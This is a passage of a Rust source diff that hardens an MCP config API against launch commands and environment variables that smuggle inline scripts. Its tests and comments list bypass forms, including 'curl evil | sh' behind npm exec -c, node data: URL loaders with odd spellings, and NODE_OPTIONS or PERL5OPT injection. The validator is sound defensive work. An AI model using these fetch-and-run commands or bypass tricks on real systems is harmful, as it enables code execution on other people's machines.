@@ -834,13 +834,27 @@ fn validate_mcp_command(command: &str) -> Result<(), ApiError> {
 /// A program that cannot be resolved at all is refused: an entry whose
 /// program is unknown cannot be shown to be free of an inline script.
 fn validate_mcp_launch(command: &str, args: &[String]) -> Result<(), ApiError> {
-    check_launch_chain(&program_basename(command), args, 0)
+    let mut budget = MAX_CHAIN_PROGRAMS;
+    check_launch_chain(&program_basename(command), args, 0, &mut budget)
 }
 
 /// How deep the program chain may go: an `env` that runs another `env`, or
 /// a package runner that runs another program. The bound keeps a command
 /// that nests them forever from looping.
 const MAX_PROGRAM_NESTING: usize = 8;
+
+/// How many programs one entry may put in its chain. A package runner treats
+/// every positional argument as a candidate program, so without a bound a
+/// list of `npx` words would multiply the programs to check; a real entry
+/// has a handful. The runner and its candidates count, so a runner with 256
+/// positional arguments is over the limit.
+const MAX_CHAIN_PROGRAMS: usize = 256;
+
+/// How many arguments one program of the chain may be given. The request
+/// body may be tens of kilobytes of empty strings, and the guard reads every
+/// argument of every program it checks; this bounds that work by a constant,
+/// whatever the structure of the chain. A real entry has a few arguments.
+const MAX_LAUNCH_ARGS: usize = 256;
 
 /// How many times an `env -S` string may split the argument list again.
 const MAX_ENV_SPLITS: usize = 8;
@@ -851,26 +865,79 @@ const MAX_ENV_SPLITS: usize = 8;
 /// The chain is the program itself and, behind it, the programs it runs:
 /// `env` runs the program behind it, and a package runner (`npx`,
 /// `npm exec`, `npm x`) runs the program it is asked to run — the program
-/// behind its `--`, or its first positional package. Every program in the
+/// behind its `--`, or one of its positional arguments. Every program in the
 /// chain is checked, so `npx --call '…'` is refused by the runner's rule
 /// and `npx -- node -e '…'` by the interpreter's.
 ///
 /// A program that cannot be resolved at all is refused: an entry whose
 /// program is unknown cannot be shown to be free of an inline script.
-fn check_launch_chain(program: &str, args: &[String], depth: usize) -> Result<(), ApiError> {
-    if depth >= MAX_PROGRAM_NESTING {
-        return Err(unresolved_program(program));
+fn check_launch_chain(
+    program: &str,
+    args: &[String],
+    depth: usize,
+    budget: &mut usize,
+) -> Result<(), ApiError> {
+    // The three limits (nesting depth, program budget, argument cap) are checked
+    // before anything is read or copied.
+    if depth >= MAX_PROGRAM_NESTING || *budget == 0 || args.len() > MAX_LAUNCH_ARGS {
+        return Err(chain_too_complex(program));
     }
+    *budget -= 1;
     if let Some(flag) = inline_script_flag(program, args) {
         return Err(err_400(format!(
             "MCP command '{program}' may not be given an inline script ({flag}); \
              the config API runs a program, not a script"
         )));
     }
-    for (child, child_args) in child_programs(program, args)? {
-        check_launch_chain(&child, &child_args, depth + 1)?;
+    if is_package_runner(program, args) {
+        // The runner's options and their values cannot be told apart from
+        // the package without a list of every option npm takes a value for,
+        // and npm has shorthands (`-C`, `--reg`) and options a list forgets.
+        // So every positional argument before the `--` is a candidate
+        // program, with the arguments after it. A value such as `/tmp` is
+        // only a candidate named `tmp`, which no rule reads. A candidate
+        // named like an interpreter and followed by an inline flag is
+        // refused even when it is the package's own argument: that is an
+        // over-refusal the guard accepts.
+        //
+        // Each candidate is a slice of the arguments and is descended into
+        // before the next one is looked at: nothing is copied per candidate.
+        let end = package_runner_separator(program, args).unwrap_or(args.len());
+        // npm's arguments open with its own subcommand, so the candidates
+        // are looked for behind it; `npx` has no subcommand of its own.
+        let start = match program {
+            "npm" => npm_runner_subcommand(args).map_or(end, |subcommand| subcommand + 1),
+            _ => 0,
+        };
+        for index in start..end {
+            if args[index].starts_with('-') {
+                continue;
+            }
+            let candidate = package_program(&args[index]);
+            check_launch_chain(&candidate, &args[index + 1..end], depth + 1, budget)?;
+        }
+        // The program behind the `--` is the one the runner was asked to
+        // run, with the arguments that follow it.
+        if let Some(command) = args.get(end + 1) {
+            let command = program_basename(command);
+            check_launch_chain(&command, &args[end + 2..], depth + 1, budget)?;
+        }
+        return Ok(());
+    }
+    for (child, child_args) in env_child(program, args)? {
+        check_launch_chain(&child, &child_args, depth + 1, budget)?;
     }
     Ok(())
+}
+
+/// The refusal for an entry whose chain of programs is longer or more
+/// complex than the guard follows: it cannot be shown to be free of an
+/// inline script.
+fn chain_too_complex(program: &str) -> ApiError {
+    err_400(format!(
+        "MCP command '{program}' may not be given an inline script: the launch chain \
+         is too long or too complex to verify; the config API runs a program, not a script"
+    ))
 }
 
 /// The refusal for a command whose program cannot be resolved.
@@ -881,54 +948,32 @@ fn unresolved_program(program: &str) -> ApiError {
     ))
 }
 
-/// The programs `program` runs in turn, and the arguments each of them
-/// would see.
+/// The program `env` runs, and the arguments it would see: empty for any
+/// other program.
 ///
 /// `env` runs the first argument that is neither an option nor a
 /// `VAR=value` assignment; an `env -S` string is split into words the way
 /// GNU `env` splits it, and a nested `env` is resolved in turn. A package
-/// runner (`npx`, `npm exec`, `npm x`) runs the program it is asked to
-/// run: the program behind its `--`, or — with no `--` — the package its
-/// first positional argument names.
-fn child_programs(program: &str, args: &[String]) -> Result<Vec<(String, Vec<String>)>, ApiError> {
-    if program == "env" {
-        let Some(command_list) = env_command_list(args) else {
-            return Err(unresolved_program(program));
-        };
-        let Some((child, child_args)) = env_program_and_args(&command_list) else {
-            return Err(unresolved_program(program));
-        };
-        return Ok(vec![(child, child_args)]);
+/// runner is not read here: it runs the program behind its `--`, or one of
+/// its positional arguments, and [`check_launch_chain`] walks those.
+fn env_child(program: &str, args: &[String]) -> Result<Vec<(String, Vec<String>)>, ApiError> {
+    if program != "env" {
+        return Ok(Vec::new());
     }
-    if is_package_runner(program, args) {
-        // Everything after the `--` is the program the runner was asked to
-        // run, and the arguments that follow it.
-        if let Some(separator) = package_runner_separator(program, args) {
-            let Some(child) = args.get(separator + 1) else {
-                return Ok(Vec::new());
-            };
-            return Ok(vec![(
-                program_basename(child),
-                args[separator + 2..].to_vec(),
-            )]);
-        }
-        return Ok(package_runner_child(program, args).into_iter().collect());
-    }
-    Ok(Vec::new())
-}
-
-/// The program a package runner runs when it is given no `--`: the first
-/// positional argument is the package the runner was asked to run, and the
-/// arguments after it are that program's.
-fn package_runner_child(program: &str, args: &[String]) -> Option<(String, Vec<String>)> {
-    // npm's arguments open with its own subcommand, so the package is
-    // looked for behind it; `npx` has no subcommand of its own.
-    let start = match program {
-        "npm" => npm_runner_subcommand(args)? + 1,
-        _ => 0,
+    let Some(command_list) = env_command_list(args) else {
+        return Err(unresolved_program(program));
     };
-    let index = args[start..].iter().position(|arg| !arg.starts_with('-'))? + start;
-    Some((package_program(&args[index]), args[index + 1..].to_vec()))
+    let Some((child, child_args)) = env_program_and_args(&command_list) else {
+        return Err(unresolved_program(program));
+    };
+    // The `NAME=value` words set variables for the program behind them, so
+    // they are read like the entry's own `env`.
+    for (name, value) in env_assignments(&command_list) {
+        if let Some(flag) = env_inline_script_flag(name, value) {
+            return Err(env_inline_script_error(name, &flag));
+        }
+    }
+    Ok(vec![(child, child_args)])
 }
 
 /// The program a package spec runs: its last path segment without the
@@ -1215,6 +1260,18 @@ fn env_program_and_args(command: &[String]) -> Option<(String, Vec<String>)> {
     Some((program_basename(&rest[index]), rest[index + 1..].to_vec()))
 }
 
+/// The `NAME=value` words that `env` sets before it runs the program: the
+/// words in front of the program in an `env` command list.
+fn env_assignments(command: &[String]) -> impl Iterator<Item = (&str, &str)> {
+    let rest = match command.first() {
+        Some(first) if first == "-" => &command[1..],
+        _ => command,
+    };
+    rest.iter()
+        .take_while(|arg| is_env_assignment(arg))
+        .filter_map(|arg| arg.split_once('='))
+}
+
 /// The name of the program a command names: the part after the last path
 /// separator, so `/bin/bash` and `bash` are the same program, folded to
 /// lower case so `/bin/SH` is `sh` too — a file system may be
@@ -1363,20 +1420,16 @@ fn inline_script_flag(program: &str, args: &[String]) -> Option<String> {
     match program {
         "sh" | "bash" | "zsh" | "dash" | "ksh" => args
             .iter()
-            .find(|arg| short_option_carries_letter(arg, &['c']))
+            .find(|arg| short_option_carries_letter(arg, &['c'], &[]))
             .cloned(),
         "fish" => args.iter().find_map(|arg| fish_inline_flag(arg)),
         "node" => {
             (0..args.len()).find_map(|index| node_inline_flag(&args[index], args.get(index + 1)))
         }
-        // `perl -E` is `perl -e` with `use feature` enabled.
-        "perl" => args
-            .iter()
-            .find(|arg| short_option_carries_letter(arg, &['e', 'E']))
-            .cloned(),
+        "perl" => args.iter().find(|arg| perl_inline_flag(arg)).cloned(),
         "ruby" => args
             .iter()
-            .find(|arg| short_option_carries_letter(arg, &['e']))
+            .find(|arg| short_option_carries_letter(arg, &['e'], RUBY_VALUE_LETTERS))
             .cloned(),
         "deno" => args.iter().find(|arg| arg.as_str() == "eval").cloned(),
         // `npx` and `npm exec` (or `npm x`) run a command rather than a
@@ -1389,35 +1442,102 @@ fn inline_script_flag(program: &str, args: &[String]) -> Option<String> {
         "npm" if is_package_runner(program, args) => package_runner_call_flag(program, args),
         _ if is_python_program(program) => args
             .iter()
-            .find(|arg| short_option_carries_letter(arg, &['c']))
+            .find(|arg| short_option_carries_letter(arg, &['c'], PYTHON_VALUE_LETTERS))
             .cloned(),
         _ => None,
     }
 }
 
-/// Whether a short-option argument is a cluster that carries one of
-/// `letters` anywhere in it, its value attached or not.
+/// The short options of each interpreter that take a value, and with it the
+/// rest of their argument: `-Wignore::DeprecationWarning` is the option `-W`
+/// with a value, not a cluster of flags. Read from `python3 --help`,
+/// `node --help`, `perl -h` and ruby's usage text (`-I directory`,
+/// `-r library`). An option that only takes digits and goes on reading the
+/// cluster (perl's `-l` and `-0`) is not listed.
+const PYTHON_VALUE_LETTERS: &[char] = &['m', 'W', 'X'];
+const NODE_VALUE_LETTERS: &[char] = &['r', 'C'];
+const PERL_VALUE_LETTERS: &[char] = &['I', 'M', 'm'];
+const RUBY_VALUE_LETTERS: &[char] = &['r', 'I'];
+
+/// How a short-option argument reads.
+enum ClusterScan<'a> {
+    /// A letter of the cluster is one of the flags looked for.
+    Flag,
+    /// A letter that takes a value comes first: the rest of the argument is
+    /// its value, not more flags.
+    Value { letter: char, value: &'a str },
+    /// Neither.
+    Plain,
+}
+
+/// Read a short-option argument as a cluster, left to right.
 ///
 /// A single leading `-` starts one or more short flags, so the letter `c`
 /// in `-c`, in a combined flag (`-lc`, `-Sc`) and in an attached value
-/// (`-c'code'`) is the same flag. A long option (`--norc`) and a bare `-`
-/// are not short options.
-fn short_option_carries_letter(arg: &str, letters: &[char]) -> bool {
-    let Some(flags) = arg.strip_prefix('-') else {
-        return false;
+/// (`-c'code'`) is the same flag. The reading stops at the first letter that
+/// takes a value (`value_letters`): what follows it is that value, so the
+/// `e` of `-rbundler/setup` is not the flag `-e`. A long option (`--norc`)
+/// and a bare `-` are not short options.
+fn scan_short_option<'a>(arg: &'a str, flags: &[char], value_letters: &[char]) -> ClusterScan<'a> {
+    let Some(cluster) = arg.strip_prefix('-') else {
+        return ClusterScan::Plain;
     };
     // A long option (`--norc`) and a bare `-` are not command flags.
-    if flags.is_empty() || flags.starts_with('-') {
-        return false;
+    if cluster.is_empty() || cluster.starts_with('-') {
+        return ClusterScan::Plain;
     }
-    flags.chars().any(|flag| letters.contains(&flag))
+    for (index, letter) in cluster.char_indices() {
+        if flags.contains(&letter) {
+            return ClusterScan::Flag;
+        }
+        if value_letters.contains(&letter) {
+            let value = &cluster[index + letter.len_utf8()..];
+            return ClusterScan::Value { letter, value };
+        }
+    }
+    ClusterScan::Plain
+}
+
+/// Whether a short-option argument is a cluster that carries one of
+/// `letters` before any letter that takes a value, its own value attached or
+/// not.
+fn short_option_carries_letter(arg: &str, letters: &[char], value_letters: &[char]) -> bool {
+    matches!(
+        scan_short_option(arg, letters, value_letters),
+        ClusterScan::Flag
+    )
+}
+
+/// Whether a perl argument runs code: `-e`/`-E`, or a `-M`/`-m` whose
+/// argument is more than a module name.
+///
+/// `perl -E` is `perl -e` with `use feature` enabled. Perl builds
+/// `use <argument> ;` out of `-M<argument>`, so `-Mstrict;print(1)` runs the
+/// `print`. Only the module name is spliced into the statement: what follows
+/// an `=` is an import list passed as a string.
+fn perl_inline_flag(arg: &str) -> bool {
+    match scan_short_option(arg, &['e', 'E'], PERL_VALUE_LETTERS) {
+        ClusterScan::Flag => true,
+        ClusterScan::Value {
+            letter: 'M' | 'm',
+            value,
+        } => {
+            let module = value.split_once('=').map_or(value, |(module, _)| module);
+            let module = module.strip_prefix('-').unwrap_or(module);
+            module.is_empty()
+                || !module
+                    .chars()
+                    .all(|c| c.is_ascii_alphanumeric() || c == '_' || c == ':')
+        }
+        _ => false,
+    }
 }
 
 /// The flag that makes fish read a command from its arguments, if `arg` is
 /// it: `-c`/`--command` or `-C`/`--execute`, in a cluster (`-iC`) or with
 /// the command attached (`--command='cmd'`).
 fn fish_inline_flag(arg: &str) -> Option<String> {
-    if short_option_carries_letter(arg, &['c', 'C']) {
+    if short_option_carries_letter(arg, &['c', 'C'], &[]) {
         return Some(arg.to_string());
     }
     let long = arg.strip_prefix("--")?;
@@ -1433,10 +1553,10 @@ fn fish_inline_flag(arg: &str) -> Option<String> {
 /// `-e`/`-p` read code inline, alone (`-e code`), in a cluster (`-pe`) or
 /// with the code attached (`-p1+1`); `--eval`/`--print` are their long
 /// forms, with the value attached (`--eval=code`) or not. `--import`,
-/// `--require` and `-r` hand node a module to run; a module given as a
-/// `data:` URL is code with no file behind it.
+/// `--require`, `-r` and the loader flags hand node a module to run; a
+/// module given as a `data:` URL is code with no file behind it.
 fn node_inline_flag(arg: &str, next: Option<&String>) -> Option<String> {
-    if short_option_carries_letter(arg, &['e', 'p']) {
+    if short_option_carries_letter(arg, &['e', 'p'], NODE_VALUE_LETTERS) {
         return Some(arg.to_string());
     }
     match arg {
@@ -1447,30 +1567,52 @@ fn node_inline_flag(arg: &str, next: Option<&String>) -> Option<String> {
     }
 }
 
-/// The node flag that loads a module, if `arg` is `--import`, `--require`
-/// or `-r` and the module is a `data:` URL — attached
-/// (`--import=data:…`, `-rdata:…`) or in the next argument. A module
-/// behind a package name or a file is left alone: this is a guard on
-/// inline code, not a sandbox.
+/// The node flag that loads a module, if `arg` is `--import`, `--require`,
+/// `-r`, `--loader` or `--experimental-loader` and the module is a `data:`
+/// URL: attached (`--import=data:…`, `-rdata:…`) or in the next argument.
+/// A module behind a package name or a file is left alone: this is a guard
+/// on inline code, not a sandbox.
 fn node_module_flag(arg: &str, next: Option<&String>) -> Option<String> {
-    // The flag's name and the module attached to it, if any.
-    let (name, attached) = if let Some(value) = arg.strip_prefix("--import=") {
-        ("--import", Some(value))
-    } else if let Some(value) = arg.strip_prefix("--require=") {
-        ("--require", Some(value))
-    } else if arg == "--import" || arg == "--require" || arg == "-r" {
-        (arg, None)
-    } else if let Some(value) = arg.strip_prefix("-r") {
-        ("-r", Some(value))
-    } else {
-        return None;
+    // `-r`, with its module attached (`-rdata:…`) or in the next argument.
+    if let Some(attached) = arg.strip_prefix("-r") {
+        let module = if attached.is_empty() {
+            next.map(String::as_str)?
+        } else {
+            attached
+        };
+        return is_data_url(module).then(|| "-r".to_string());
+    }
+    // A long flag, with its module after an `=` or in the next argument.
+    // Node reads `_` in the name as `-`.
+    let (name, attached) = match arg.split_once('=') {
+        Some((name, module)) => (name, Some(module)),
+        None => (arg, None),
     };
+    let name = name.replace('_', "-");
+    if !matches!(
+        name.as_str(),
+        "--import" | "--require" | "--loader" | "--experimental-loader"
+    ) {
+        return None;
+    }
     let module = match attached {
-        Some(value) => value,
-        // A bare flag takes the module from the next argument.
+        Some(module) => module,
         None => next.map(String::as_str)?,
     };
-    module.starts_with("data:").then(|| name.to_string())
+    is_data_url(module).then_some(name)
+}
+
+/// Whether a module specifier is a `data:` URL. Node reads the scheme
+/// case-insensitively and, like any URL parser, skips leading control
+/// characters and spaces and drops a tab or a newline inside the value.
+fn is_data_url(module: &str) -> bool {
+    let module: String = module
+        .trim_start_matches(|c: char| c <= ' ')
+        .chars()
+        .filter(|c| !matches!(c, '\t' | '\n' | '\r'))
+        .take(5)
+        .collect();
+    module.eq_ignore_ascii_case("data:")
 }
 
 /// The `npx`/`npm exec` flag that runs a command instead of a package.
@@ -1496,20 +1638,26 @@ fn is_package_runner(program: &str, args: &[String]) -> bool {
     }
 }
 
+/// The short options of `npx` and `npm` that take a value and are read in a
+/// cluster. `-w` is `--workspace`. `-p` is not here: in nopt it is
+/// `--parseable`, a flag with no value, so the `c` of `-pc` is `-c`; only
+/// an exact `-p` is npx's `--package`, and the argument after it is just
+/// another candidate program (see [`check_launch_chain`]).
+const RUNNER_VALUE_LETTERS: &[char] = &['w'];
+
 /// The index of npm's package-runner subcommand, if the arguments name it:
-/// `npm exec`, or the abbreviation `npm x`.
+/// `npm exec`, or its abbreviations `npm x` and `npm exe` (`ex` is not one:
+/// npm reads it as ambiguous with `explain` and `explore`).
 ///
-/// npm's subcommand is its first argument that is not an option, so
-/// `npm run x` — whose first one is `run` — stays `npm run`, while an
-/// `exec` found behind npm's own options (`npm --prefix /tmp exec pkg`)
-/// is still the subcommand.
+/// The subcommand is the first `exec`, `exe` or `x` among the arguments. npm's own
+/// options may come first and some take a value (`npm --prefix /tmp exec
+/// pkg`, `npm -C /tmp x pkg`), and a list of them would miss one, so the
+/// words are read wherever they stand. A value that is `x`, `exe` or `exec`
+/// makes a false positive, which the guard accepts: it only matters when an
+/// inline flag follows. `npm run start` has neither word and stays `npm run`.
 fn npm_runner_subcommand(args: &[String]) -> Option<usize> {
-    if let Some(index) = args.iter().position(|arg| arg == "exec") {
-        return Some(index);
-    }
     args.iter()
-        .position(|arg| !arg.starts_with('-'))
-        .filter(|&index| args[index] == "x")
+        .position(|arg| matches!(arg.as_str(), "exec" | "exe" | "x"))
 }
 
 /// The index of the `--` that ends a package runner's own options, if it
@@ -1542,12 +1690,20 @@ fn is_python_program(program: &str) -> bool {
             && suffix.chars().all(|c| c.is_ascii_digit() || c == '.'))
 }
 
-/// The `npx`/`npm exec` flag that runs a command instead of a package.
+/// The `npx`/`npm exec` flag that runs a command instead of a package: `-c`,
+/// alone or in a cluster (`-yc`), and `--call`.
+///
+/// The abbreviations `--ca` and `--cal` are refused as well. npm does not
+/// necessarily resolve them to `--call` (`npx --cal 'echo x'` reads the
+/// command as a package name, and npm has an option named exactly `--ca`),
+/// so this is a conservative over-refusal, not a claim about npm.
 fn package_runner_call(arg: &str) -> Option<String> {
-    match arg {
-        "-c" => Some("-c".to_string()),
-        "--call" => Some("--call".to_string()),
-        other if other.starts_with("--call=") => Some("--call".to_string()),
+    if short_option_carries_letter(arg, &['c'], RUNNER_VALUE_LETTERS) {
+        return Some(arg.to_string());
+    }
+    let long = arg.strip_prefix("--")?;
+    match long.split('=').next()? {
+        "ca" | "cal" | "call" => Some("--call".to_string()),
         _ => None,
     }
 }
@@ -1557,6 +1713,90 @@ fn package_runner_call(arg: &str) -> Option<String> {
 fn is_loader_env_key(key: &str) -> bool {
     let k = key.to_ascii_uppercase();
     k == "LD_PRELOAD" || k == "LD_LIBRARY_PATH" || k.starts_with("DYLD_")
+}
+
+/// Refuse an MCP `env` map that hands the launcher code to run.
+///
+/// A launcher reads some variables as options: `NODE_OPTIONS=--import=data:…`
+/// makes `npx -y pkg` run the `data:` module before the package starts.
+/// Only the variables the launchers of [`inline_script_flag`] read are
+/// looked at, and a value is refused for the same flags the command line is
+/// (see [`env_inline_script_flag`]).
+fn validate_mcp_env(env: &HashMap<String, String>) -> Result<(), ApiError> {
+    for (name, value) in env {
+        if let Some(flag) = env_inline_script_flag(name, value) {
+            return Err(env_inline_script_error(name, &flag));
+        }
+    }
+    Ok(())
+}
+
+/// The refusal for an environment variable that carries an inline script.
+fn env_inline_script_error(name: &str, flag: &str) -> ApiError {
+    err_400(format!(
+        "MCP env var '{name}' may not carry an inline script ({flag}); \
+         the config API runs a program, not a script"
+    ))
+}
+
+/// The options in a `NODE_OPTIONS` value, split the way node splits it.
+///
+/// Only a space separates options, and not inside double quotes. A `"`
+/// opens or closes a quoted part and is not part of the option. Inside
+/// quotes a backslash takes the next character literally, so
+/// `--import="d\ata:…"` is `--import=data:…`; outside quotes a backslash is
+/// a backslash. A token is kept only when it is not empty. Node refuses a
+/// value with an unterminated quote and runs nothing, so what is left open
+/// is read as if it were closed.
+fn node_options_tokens(value: &str) -> Vec<String> {
+    let mut tokens = Vec::new();
+    let mut token = String::new();
+    let mut quoted = false;
+    let mut chars = value.chars();
+    while let Some(c) = chars.next() {
+        match c {
+            '\\' if quoted => token.extend(chars.next()),
+            ' ' if !quoted => {
+                if !token.is_empty() {
+                    tokens.push(std::mem::take(&mut token));
+                }
+            }
+            '"' => quoted = !quoted,
+            _ => token.push(c),
+        }
+    }
+    if !token.is_empty() {
+        tokens.push(token);
+    }
+    tokens
+}
+
+/// The flag that makes a launcher run code, when the environment variable
+/// `name` is one the launcher reads as options and `value` holds the flag.
+///
+/// `NODE_OPTIONS` is read as node's own command line, so the rules of the
+/// `node` interpreter apply: `-e`/`--eval`/`-p`/`--print` (node refuses them
+/// in `NODE_OPTIONS`, and they are refused here anyway) and a `data:` module
+/// behind `--import`, `--require`, `-r` or a loader flag. The value is split
+/// the way node splits it (see [`node_options_tokens`]). A module that is a
+/// file is a program being run and is left alone.
+///
+/// `PERL5OPT` is read as perl switches, with or without the leading `-`.
+/// Perl accepts only `-[CDIMTUWdmtw]` there, so the code it can carry is a
+/// `-M`/`-m` argument, which perl splices into a `use` statement.
+///
+/// Not covered, because the launcher cannot be handed code through them:
+/// `RUBYOPT` takes `-r library` and no `-e`, and `PYTHONSTARTUP` runs only
+/// in an interactive session.
+fn env_inline_script_flag(name: &str, value: &str) -> Option<String> {
+    match name.to_ascii_uppercase().as_str() {
+        "NODE_OPTIONS" => inline_script_flag("node", &node_options_tokens(value)),
+        "PERL5OPT" => value.split_whitespace().find_map(|switch| {
+            let switch = format!("-{}", switch.trim_start_matches('-'));
+            perl_inline_flag(&switch).then_some(switch)
+        }),
+        _ => None,
+    }
 }
 
 /// Validate autonomy tool-list entries. A malformed entry (empty, whitespace, or
@@ -1714,6 +1954,9 @@ async fn add_mcp_server(
     // inherits the stored `args`, and an inherited inline script is refused
     // too.
     validate_mcp_launch(&merged.command, &merged.args)?;
+    // The same goes for the env: an incoming `""` is restored from the stored
+    // value by the merge, so the values are read here, not on the request.
+    validate_mcp_env(&merged.env)?;
     cfg.mcp_servers.insert(name.clone(), merged);
     let count = cfg.mcp_servers.len();
     persist_and_swap(&state, cfg, "mcp_servers").await?;
@@ -3764,6 +4007,703 @@ mod tests {
         }
     }
 
+    /// Assert that the launch rule refuses `command` with `args` as an inline
+    /// script, with a 400 that says so.
+    fn assert_launch_refused(command: &str, args: &[String]) {
+        let err = match validate_mcp_launch(command, args) {
+            Ok(()) => panic!("{command} {args:?} must be refused"),
+            Err(err) => err,
+        };
+        let (status, body) = err;
+        assert_eq!(status, StatusCode::BAD_REQUEST, "{command} {args:?}");
+        let detail = body.0["detail"].as_str().unwrap_or_default();
+        assert!(
+            detail.contains("inline script"),
+            "{command} {args:?} must say why: {detail}"
+        );
+    }
+
+    /// A package runner reads some of its options with a value in the next
+    /// argument, and npm has more of them, with shorthands, than
+    /// a list could keep up with. Every positional argument is a candidate
+    /// for the program the runner runs, so the program behind an option value
+    /// is found whichever option it is.
+    #[test]
+    fn validate_mcp_launch_finds_the_program_behind_a_runner_option_value() {
+        for (command, args) in [
+            (
+                "npx",
+                strings(&["-p", "cowsay", "node", "-e", "console.log(1)"]),
+            ),
+            (
+                "npx",
+                strings(&["--package", "cowsay", "node", "-e", "console.log(1)"]),
+            ),
+            (
+                "npx",
+                strings(&["--cache", "/tmp", "node", "-e", "console.log(1)"]),
+            ),
+            (
+                "npx",
+                strings(&[
+                    "--registry",
+                    "https://registry.example.com",
+                    "node",
+                    "-e",
+                    "console.log(1)",
+                ]),
+            ),
+            (
+                "npx",
+                strings(&["--prefix", "/tmp", "node", "-e", "console.log(1)"]),
+            ),
+            (
+                "npx",
+                strings(&["-w", "pkg", "node", "-e", "console.log(1)"]),
+            ),
+            (
+                "npx",
+                strings(&["--workspace", "pkg", "node", "-e", "console.log(1)"]),
+            ),
+            (
+                "npx",
+                strings(&["--userconfig", "/tmp/rc", "node", "-e", "console.log(1)"]),
+            ),
+            (
+                "npm",
+                strings(&["exec", "-p", "cowsay", "node", "-e", "console.log(1)"]),
+            ),
+            // `-C` is npm's shorthand of `--prefix` and `--reg` of
+            // `--registry`. npm may not read the prefixes below as those
+            // options, and the program behind them is found either way.
+            (
+                "npx",
+                strings(&["-C", "/tmp", "node", "-e", "console.log(1)"]),
+            ),
+            (
+                "npx",
+                strings(&["--reg", "https://r.example", "node", "-e", "console.log(1)"]),
+            ),
+            (
+                "npx",
+                strings(&["--cach", "/tmp", "node", "-e", "console.log(1)"]),
+            ),
+            (
+                "npx",
+                strings(&["--pref", "/tmp", "node", "-e", "console.log(1)"]),
+            ),
+            (
+                "npx",
+                strings(&[
+                    "--regis",
+                    "https://r.example",
+                    "node",
+                    "-e",
+                    "console.log(1)",
+                ]),
+            ),
+            (
+                "npx",
+                strings(&["--userc", "/tmp/rc", "node", "-e", "console.log(1)"]),
+            ),
+            (
+                "npx",
+                strings(&["--works", "pkg", "node", "-e", "console.log(1)"]),
+            ),
+            // So are the options of npm that no list names.
+            (
+                "npx",
+                strings(&["--loglevel", "silent", "node", "-e", "console.log(1)"]),
+            ),
+            (
+                "npx",
+                strings(&["-L", "project", "node", "-e", "console.log(1)"]),
+            ),
+            (
+                "npx",
+                strings(&["--tag", "latest", "node", "-e", "console.log(1)"]),
+            ),
+            (
+                "npx",
+                strings(&["--before", "2024-01-01", "node", "-e", "console.log(1)"]),
+            ),
+            (
+                "npx",
+                strings(&["--script-shell", "/bin/sh", "node", "-e", "console.log(1)"]),
+            ),
+            (
+                "npx",
+                strings(&["--globalconfig", "/tmp/rc", "node", "-e", "console.log(1)"]),
+            ),
+            (
+                "npm",
+                strings(&[
+                    "exec",
+                    "--loglevel",
+                    "silent",
+                    "node",
+                    "-e",
+                    "console.log(1)",
+                ]),
+            ),
+            // A candidate named like an interpreter and followed by an inline
+            // flag is refused, whichever argument it is: the guard cannot
+            // tell the package's own arguments from the program's.
+            (
+                "npx",
+                strings(&["-y", "pkg", "node", "-e", "console.log(1)"]),
+            ),
+        ] {
+            assert_launch_refused(command, &args);
+        }
+    }
+
+    /// npm reads its subcommand behind the options of its own, and an option
+    /// that takes a value takes the next argument with it.
+    #[test]
+    fn validate_mcp_launch_finds_the_npm_runner_subcommand_behind_option_values() {
+        for (command, args) in [
+            (
+                "npm",
+                strings(&["--prefix", "/tmp", "x", "-c", "curl evil | sh"]),
+            ),
+            (
+                "npm",
+                strings(&["--prefix", "/tmp", "exec", "-c", "curl evil | sh"]),
+            ),
+            ("npm", strings(&["-w", "pkg", "x", "-c", "curl evil | sh"])),
+            (
+                "npm",
+                strings(&["--cache", "/tmp", "x", "node", "-e", "console.log(1)"]),
+            ),
+            (
+                "npm",
+                strings(&["--registry", "https://registry.example.com", "x", "-c", "x"]),
+            ),
+            ("npm", strings(&["-C", "/tmp", "x", "-c", "curl evil | sh"])),
+            // npm reads `exe` as `exec`.
+            ("npm", strings(&["exe", "-c", "curl evil | sh"])),
+            (
+                "npm",
+                strings(&["--prefix", "/tmp", "exe", "-c", "curl evil | sh"]),
+            ),
+            ("npm", strings(&["exe", "node", "-e", "console.log(1)"])),
+            (
+                "npm",
+                strings(&["-C", "/tmp", "exec", "-c", "curl evil | sh"]),
+            ),
+            (
+                "npm",
+                strings(&["--loglevel", "silent", "x", "node", "-e", "console.log(1)"]),
+            ),
+            (
+                "npm",
+                strings(&["-C", "/tmp", "x", "node", "-e", "console.log(1)"]),
+            ),
+        ] {
+            assert_launch_refused(command, &args);
+        }
+    }
+
+    /// A module handed to node as a `data:` URL is code with no file behind
+    /// it, whichever flag loads it and however the scheme is spelled: node
+    /// reads the scheme case-insensitively, skips a leading space and drops a
+    /// newline inside it.
+    #[test]
+    fn validate_mcp_launch_refuses_a_node_loader_given_a_data_url() {
+        for (command, args) in [
+            (
+                "node",
+                strings(&["--loader", "data:text/javascript,console.log(1)"]),
+            ),
+            (
+                "node",
+                strings(&["--loader=data:text/javascript,console.log(1)"]),
+            ),
+            (
+                "node",
+                strings(&[
+                    "--experimental-loader",
+                    "data:text/javascript,console.log(1)",
+                ]),
+            ),
+            (
+                "node",
+                strings(&["--experimental-loader=data:text/javascript,console.log(1)"]),
+            ),
+            // Node reads `_` in an option name as `-`.
+            (
+                "node",
+                strings(&["--experimental_loader=data:text/javascript,console.log(1)"]),
+            ),
+            (
+                "node",
+                strings(&["--import", "DATA:text/javascript,console.log(1)"]),
+            ),
+            (
+                "node",
+                strings(&["--import=Data:text/javascript,console.log(1)"]),
+            ),
+            (
+                "node",
+                strings(&["--require=DATA:text/javascript,console.log(1)"]),
+            ),
+            (
+                "node",
+                strings(&["-r", "DATA:text/javascript,console.log(1)"]),
+            ),
+            (
+                "node",
+                strings(&["--import", " data:text/javascript,console.log(1)"]),
+            ),
+            (
+                "node",
+                strings(&["--import", "da\nta:text/javascript,console.log(1)"]),
+            ),
+            // Behind a package runner it is the same node.
+            (
+                "npx",
+                strings(&["-y", "node", "--loader=data:text/javascript,console.log(1)"]),
+            ),
+        ] {
+            assert_launch_refused(command, &args);
+        }
+    }
+
+    /// A module that is a file or a package is a program being run, which
+    /// the route allows, so a loader flag is refused only for a `data:` URL.
+    #[test]
+    fn validate_mcp_launch_accepts_a_node_module_that_is_a_file() {
+        for (command, args) in [
+            ("node", strings(&["--require", "./preload.js", "server.js"])),
+            ("node", strings(&["--import=./register.mjs", "server.js"])),
+            ("node", strings(&["--loader", "./hooks.mjs", "server.js"])),
+            (
+                "node",
+                strings(&["--experimental-loader=ts-node/esm", "server.js"]),
+            ),
+        ] {
+            assert!(
